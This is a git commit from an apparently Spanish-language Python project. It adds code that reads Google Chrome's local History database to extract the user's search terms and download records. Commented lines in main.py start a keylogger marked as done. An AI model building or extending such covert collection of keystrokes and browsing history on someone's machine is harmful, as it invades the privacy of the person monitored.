451bd3618d6efe24e02acd7ba16b62a51de78df9
Bayron Jonathan Vazquez <bayronnjonathan@gmail.com>
2024-01-21 20:22:04 -0600

    `Feature` consultar el historial de terminos de busquedas

--- controller/GoogleChromeController.py
+++ controller/GoogleChromeController.py
@@ -10,9 +10,6 @@ class GoogleChromeController:
         self.db_directory = self.fs_controller.get_home_directory() + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 
     def get_download_history(self):
-        # target_path
-        # start_time
-        # tab_url sino referrer
         db_file = self.db_directory + 'History'
 
         if os.path.exists(db_file):
@@ -20,6 +17,31 @@ class GoogleChromeController:
                 conexion = sqlite3.connect(db_file)
                 cursor = conexion.cursor()
                 cursor.execute('SELECT * FROM downloads')
+                filas = cursor.fetchall()
+                nombres_columnas = [descripcion[0] for descripcion in cursor.description]
+                array_de_diccionarios = []
+
+                for fila in filas:
+                    diccionario_fila = dict(zip(nombres_columnas, fila))
+                    array_de_diccionarios.append(diccionario_fila)
+
+                return array_de_diccionarios
+
+            except Exception as exception:
+                print(f"Ocurrió una excepción: {exception}")
+                return None
+        else:
+            print("NO EXISTE")
+            return None
+
+    def get_serach_history(self):
+        db_file = self.db_directory + 'History'
+
+        if os.path.exists(db_file):
+            try:
+                conexion = sqlite3.connect(db_file)
+                cursor = conexion.cursor()
+                cursor.execute('SELECT * FROM keyword_search_terms LEFT JOIN urls ON urls.id = keyword_search_terms.url_id')
                 filas = cursor.fetchall()
                 nombres_columnas = [descripcion[0] for descripcion in cursor.description]
                 array_de_diccionarios = []
--- main.py
+++ main.py
@@ -9,32 +9,29 @@ from controller.GoogleChromeController  import GoogleChromeController
 import os
 
 if __name__ == "__main__":
+
     fs_controller = FileSystemController()
     directorio_home = fs_controller.get_home_directory() 
 
-    # Iniciamos el Keylogger [OK]
+    # [Done] Iniciamos el Keylogger
     # keylogger = KeyloggerController(interval=10)
     # keylogger.start()
 
-
- 
-    # hostname = "192.168.1.220" #example
-    # comando_ping_para_windows = "ping -n 1 " + hostname
-    # comando_ping_para_linux   = "ping -c 1 " + hostname
-
-    # response = os.system(comando_ping_para_linux)
-
-    # #and then check the response...
-    # if response == 0:
-    #     print(hostname, 'is up!')
-    # else:
-    #     print(hostname, 'is down!')
-
+    # 
     google_controller = GoogleChromeController()
     historial_de_descargas = google_controller.get_download_history()
+    historial_de_busquedas = google_controller.get_serach_history()
 
     if historial_de_descargas:
         for fila in historial_de_descargas:
-            print(fila['target_path'])
+            # estos son los campos que importan target_path, start_time, tab_url sino referrer
+            pass
+    else:
+        print("aaa")
+
+    if historial_de_busquedas:
+        for fila in historial_de_busquedas:
+            # estos son los campos que importan term, url ejemplo print(fila['term'])
+            pass
     else:
         print("No se obtuvieron resultados.")
